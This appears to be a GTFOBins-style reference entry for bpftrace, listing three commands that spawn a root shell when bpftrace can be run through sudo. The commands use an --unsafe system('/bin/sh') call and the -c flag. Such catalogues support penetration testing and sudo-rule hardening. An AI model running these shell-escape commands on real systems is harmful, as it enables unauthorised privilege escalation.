---
type: gtfobin
name: bpftrace
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# bpftrace

## shell

```bash
bpftrace --unsafe -e 'BEGIN {system("/bin/sh 1<&0");exit()}'
```
**Contexts:** sudo

```bash
echo 'BEGIN {system("/bin/sh 1<&0");exit()}' >/path/to/temp-file
bpftrace --unsafe /path/to/temp-file
```
**Contexts:** sudo

```bash
bpftrace -c /bin/sh -e 'END {exit()}'
```
**Contexts:** sudo
